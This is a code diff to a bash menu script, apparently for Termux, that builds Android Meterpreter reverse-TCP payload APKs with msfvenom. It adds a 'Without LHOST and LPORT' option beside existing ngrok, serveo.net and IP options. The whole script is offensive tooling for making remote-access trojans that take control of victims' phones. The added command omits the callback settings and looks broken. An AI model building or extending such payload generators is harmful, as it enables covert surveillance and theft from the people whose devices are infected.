@@ -35,6 +35,15 @@ serveo () {
 	read
 	payload
 	}
+	without () {
+		clear
+		printf "\n\n\033[92m Creating payload......\n"
+		msfvenom -p android/meterpreter/reverse_tcp R > /sdcard/Payload/without-Lhost-Lport-payload.apk
+		printf "\n\n\033[96m [√] Successfully Create payload in /sdcard/Payload\n\n"
+		printf "Press enter to back"
+		read
+		payload
+		}
 		ips () {
 	clear
 	ll="e"
@@ -137,11 +146,13 @@ ngrok () {
 	aa="	$lal [ 1 ]$pila Using Ngrok"
 	bb="	$lal [ 2 ]$pila Using serveo.net"
 	cc="	$lal [ 3 ]$pila Using Ip"
-	dd="	$lal [ 4 ]$pila Home"
-	ee="	$lal [ 5 ]$pila Exit"
+	ccc="	$lal [ 4 ]$pila Without LHOST and LPORT"
+	dd="	$lal [ 5 ]$pila Home"
+	ee="	$lal [ 6 ]$pila Exit"
 	$ll$i$k$h $o "$aa"
 	$ll$i$k$h $o "$bb"
 	$ll$i$k$h $o "$cc"
+	$ll$i$k$h $o "$ccc"
 	$ll$i$k$h $o "$dd"
 	$ll$i$k$h $o "$ee"
 	$ll$i$k$h
@@ -151,8 +162,9 @@ ngrok () {
 	1)ngrok ;;
 	2)serveo ;;
 	3)ips ;;
-	4)msf-s ;;
-	5)exit 0
+	4)without ;;
+	5)msf-s ;;
+	6)exit 0
 	esac
 	}
 metasploit () {
